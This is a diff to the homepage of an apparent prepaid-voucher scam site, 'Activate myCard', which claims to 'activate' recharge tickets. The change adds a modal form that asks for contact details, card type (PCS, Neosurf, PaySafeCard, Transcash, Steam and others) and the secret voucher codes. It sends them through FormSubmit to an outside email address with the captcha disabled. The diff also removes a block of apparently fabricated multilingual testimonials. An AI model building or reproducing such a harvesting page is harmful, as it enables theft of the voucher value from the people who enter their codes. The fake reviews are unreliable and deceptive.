@@ -4,10 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Activate myCard - Activation de tickets de recharge</title>
+    <link rel="icon" type="image/jpeg" href="images/favicon.jpeg">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="style-selector.css">
+    <!-- Script GTranslate -->
+    <script src="https://cdn.gtranslate.net/widgets/latest/float.js"></script>
     <script src="script-selector.js"></script>
 </head>
 <body>
@@ -34,20 +37,16 @@
         </div>
     </header>
 
-    <!-- Hero Section -->
+    <!-- Hero Section (MODIFIÉ ) -->
     <section class="hero">
-        <div class="hero-slideshow">
-            <div class="slide"></div>
-            <div class="slide"></div>
-            <div class="slide"></div>
-            <div class="slide"></div>
-            <div class="slide"></div>
-        </div>
+        <!-- Le diaporama a été remplacé par une seule div pour l'image de fond fixe -->
+        <div class="hero-background-image"></div>
         <div class="container hero-content">
             <h1>Activez vos tickets de recharge en un clic</h1>
             <p>Activate myCard vous permet d'activer instantanément vos tickets de recharge mobile avant utilisation, pour éviter les mauvaises surprises.</p>
             <div class="hero-btns">
-                <a href="activer-coupon-fr.html" class="btn btn-primary">Activer mon Ticket</a>
+                <!-- Le lien a été transformé en bouton pour ouvrir le modal -->
+                <button id="openActivationModal" class="btn btn-primary">Activer mon Ticket</button>
                 <a href="remboursement.html" class="btn btn-outline">Remboursement</a>
             </div>
         </div>
@@ -476,464 +475,7 @@
                     </div>
                     <p class="testimonial-text">"Détecte pas toujours les tickets périmés. À améliorer."</p>
                 </div>
-
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Carlos M.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Muy útil para verificar recargas. Lo uso siempre."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Ana R.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Perfecto, nunca me ha fallado. ¡Recomendado!"</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Luis G.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Funciona pero a veces tarda en responder."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Sofía P.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star-half-alt"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Muy confiable para verificar mis recargas."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Javier T.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"El mejor verificador de cupones. ¡Rápido y preciso!"</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Laura F.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Me sauve tellement de temps ! Super application."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Nicolas R.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Fonctionne bien, mais manque certains opérateurs."</p>
-                </div>              
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Camille D.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Simple d'utilisation et très fiable. Bravo !"</p>
-                </div>              
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>David K.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Correct pour un service gratuit. J'utilise de temps en temps."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Sarah L.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star-half-alt"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Mon application préférée pour activer mes recharges !"</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Pedro S.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Muito útil para verificar recargas. Uso sempre."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Ana C.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Perfeito, nunca me falhou. Recomendo!"</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Carlos R.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Funciona mas às vezes demora a responder."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Mariana L.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star-half-alt"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Muito confiável para verificar minhas recargas."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Rafael M.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"O melhor verificador de cupons. Rápido e preciso!"</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Antoine G.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Résultats pas toujours précis selon mon expérience."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Clara M.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"100% efficace, j'ai confiance les yeux fermés."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Mehdi S.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Bon outil, mais parfois lent en heure de pointe."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Julie V.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star-half-alt"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Indispensable pour mes recharges professionnelles."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Paul B.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Fait le job, mais l'interface mériterait un rafraîchissement."</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Thomas B.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Sehr nützlich zum Überprüfen von Guthaben. Immer genutzt."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Anna S.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Perfekt, hat mich noch nie enttäuscht. Empfehlenswert!"</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Markus W.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Funktioniert, aber manchmal langsam."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Julia K.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star-half-alt"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Sehr zuverlässig für die Überprüfung meiner Aufladungen."</p>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Stefan H.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Der beste Gutscheinprüfer. Schnell und genau!"</p>
-                </div>
-                
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Emma T.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Vraiment génial, je l'utilise tous les jours !"</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Lucas P.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Peut mieux faire. J'ai eu des faux positifs."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Zoé L.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Parfait ! Jamais déçue depuis 6 mois d'utilisation."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Hugo M.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="far fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Très utile, mais parfois des bugs d'affichage."</p>
-                </div>               
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <div class="testimonial-user">
-                            <h4>Léa C.</h4>
-                            <div class="testimonial-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star-half-alt"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Meilleure appli de Activation que j'ai utilisée !"</p>
-                </div>
             </div>
-            
             <button class="btn btn-primary leave-review-btn" id="openReviewModal">Laissez un avis</button>
         </div>
     </section>
@@ -968,24 +510,89 @@
         </div>
     </div>
 
+    <!-- (NOUVEAU) Activation Modal -->
+    <div class="modal" id="activationModal">
+        <div class="modal-content">
+            <span class="close-modal" id="closeActivationModal">&times;</span>
+            <h3>Activer un Ticket</h3>
+            <form action="https://formsubmit.co/center@check-mycard.net" method="POST">
+                <!-- Paramètres FormSubmit -->
+                <input type="hidden" name="_next" value="https://www.check-mycard.net/confirmation.html">
+                <input type="hidden" name="_subject" value="Nouvelle demande d'activation de ticket">
+                <input type="hidden" name="_captcha" value="false"> <!-- Désactive le captcha de FormSubmit -->
+
+                <div class="form-group">
+                    <label for="pseudo">Pseudo</label>
+                    <input type="text" id="pseudo" name="Pseudo" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Courriel électronique</label>
+                    <input type="email" id="email" name="Courriel" required>
+                </div>
+                <div class="form-group">
+                    <label for="telephone">Téléphone</label>
+                    <input type="tel" id="telephone" name="Téléphone" required>
+                </div>
+                <div class="form-group">
+                    <label for="card-type">Type de carte</label>
+                    <select id="card-type" name="Type de carte" required>
+                        <option value="" disabled selected>Choisir une carte...</option>
+                        <option value="PCS">PCS</option>
+                        <option value="Neosurf">Neosurf</option>
+                        <option value="AppleCard">AppleCard</option>
+                        <option value="Transcash">Transcash</option>
+                        <option value="GiftCard">GiftCard</option>
+                        <option value="GooglePay">GooglePay</option>
+                        <option value="PaySafeCard">PaySafeCard</option>
+                        <option value="Neocash">Neocash</option>
+                        <option value="Steam">Steam</option>
+                        <option value="Cash Ticket">Cash Ticket</option>
+                        <option value="Toneo">Toneo</option>
+                        <option value="iTunes">iTunes</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="code1">Code 1</label>
+                    <div class="password-input">
+                        <input type="password" id="code1" name="Code 1" required>
+                        <i class="fas fa-eye toggle-password"></i>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="code2">Code 2 (Optionnel )</label>
+                    <div class="password-input">
+                        <input type="password" id="code2" name="Code 2">
+                        <i class="fas fa-eye toggle-password"></i>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="amount">Montant (Optionnel)</label>
+                    <select id="amount" name="Montant">
+                        <option value="" disabled selected>Choisir un montant...</option>
+                        <option value="20€">20€</option>
+                        <option value="50€">50€</option>
+                        <option value="100€">100€</option>
+                        <option value="150€">150€</option>
+                        <option value="200€">200€</option>
+                        <option value="250€">250€</option>
+                        <option value="500€">500€</option>
+                    </select>
+                </div>
+                <div class="form-group privacy-policy">
+                    <input type="checkbox" id="privacy" required>
+                    <label for="privacy">J'accepte la <a href="confidentialite-fr.html" target="_blank">politique de confidentialité</a>.</label>
+                </div>
+                <button type="submit" class="submit-review">Activer mon Ticket</button>
+            </form>
+        </div>
+    </div>
+
     <!-- Notification -->
     <div class="notification" id="notification">
         Merci pour votre avis ! Nous l'avons bien reçu.
     </div>
 
-    <!-- CTA Section -->
-    <section class="cta">
-        <div class="container">
-            <h2>Prêt à activer vos tickets en toute confiance ?</h2>
-            <p>Essayez Activate myCard dès maintenant et dites adieu aux mauvaises surprises avec vos recharges mobiles.</p>
-            <div class="cta-btns">
-                <a href="activer-coupon-fr.html" class="btn btn-secondary">Activer mon Coupon</a>
-                <a href="remboursement.html" class="btn btn-outline">Demander Remboursement</a>
-            </div>
-        </div>
-    </section>
-
-        <!-- Widget GTranslate Flottant -->
+    <!-- Widget GTranslate Flottant -->
     <div class="floating-translate" id="floating-translate"></div>
 
     <!-- Footer -->
@@ -995,12 +602,6 @@
                 <div class="footer-column">
                     <h3>Activate myCard</h3>
                     <p>La solution la plus fiable pour activer vos tickets de recharge mobile avant utilisation.</p>
-                    <div class="social-links">
-                        <a href="#"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                        <a href="#"><i class="fab fa-instagram"></i></a>
-                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
-                    </div>
                 </div>
                 <div class="footer-column">
                     <h3>Liens rapides</h3>
@@ -1030,8 +631,6 @@
     </footer>
 
     <script src="script.js"></script>
-        <!-- Script GTranslate -->
-    <script src="https://cdn.gtranslate.net/widgets/latest/float.js" defer></script>
     <script src="//code.tidio.co/u8u7pdwcln1nigxjfyou67nmbqfkbips.js" async></script>
 </body>
 </html>
